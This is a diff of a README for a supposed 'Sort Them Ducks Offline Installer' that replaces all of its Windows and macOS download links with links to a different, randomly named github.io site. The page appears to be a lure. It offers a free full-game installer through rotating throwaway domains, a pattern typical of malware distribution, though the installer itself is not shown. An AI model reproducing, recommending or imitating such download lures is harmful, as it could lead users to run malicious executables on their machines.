@@ -1,8 +1,8 @@
 # Sort Them Ducks Offline Installer
 
-[![Download](https://img.shields.io/badge/Download-Installer-blue?style=for-the-badge)](https://hydracomptrollercord.github.io/Downloader/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Mac-lightgrey?style=for-the-badge)](https://hydracomptrollercord.github.io/Downloader/)
-[![Version](https://img.shields.io/badge/Version-Latest-green?style=for-the-badge)](https://hydracomptrollercord.github.io/Downloader/)
+[![Download](https://img.shields.io/badge/Download-Installer-blue?style=for-the-badge)](https://spearsurvive.github.io/win/)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Mac-lightgrey?style=for-the-badge)](https://spearsurvive.github.io/win/)
+[![Version](https://img.shields.io/badge/Version-Latest-green?style=for-the-badge)](https://spearsurvive.github.io/win/)
 
 > Sort Them Ducks Offline Installer — full game, all puzzles and worlds, plays without internet.
 
@@ -12,8 +12,8 @@
 
 | Platform | Link | Size |
 |----------|------|------|
-| **Windows** | [Download Installer](https://hydracomptrollercord.github.io/Downloader/) | 1 GB |
-| **macOS** | [Download Installer](https://hydracomptrollercord.github.io/MacDownloader/) | 1 GB |
+| **Windows** | [Download Installer](https://spearsurvive.github.io/win/) | 1 GB |
+| **macOS** | [Download Installer](https://spearsurvive.github.io/mac/) | 1 GB |
 
 ---
 
